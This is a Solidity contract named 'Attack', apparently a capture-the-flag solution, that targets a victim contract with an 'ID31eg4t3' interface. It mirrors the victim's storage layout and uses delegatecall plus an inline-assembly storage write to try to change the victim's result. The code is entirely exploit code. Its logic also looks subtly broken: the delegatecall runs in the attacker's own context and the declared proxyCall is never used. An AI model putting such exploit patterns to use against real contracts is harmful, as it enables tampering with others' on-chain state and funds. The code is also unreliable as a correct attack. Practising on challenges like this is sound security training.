// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    bool private storageSlot; // For storing manipulated data in storage

    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;

    constructor(address addr) payable {
        victim = addr;
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature("changeResult()");
        (bool success,) = victim.delegatecall(data);
        require(success, "Delegatecall failed");

        assembly {
            sstore(storageSlot.slot, 1)
        }
    }
    
}
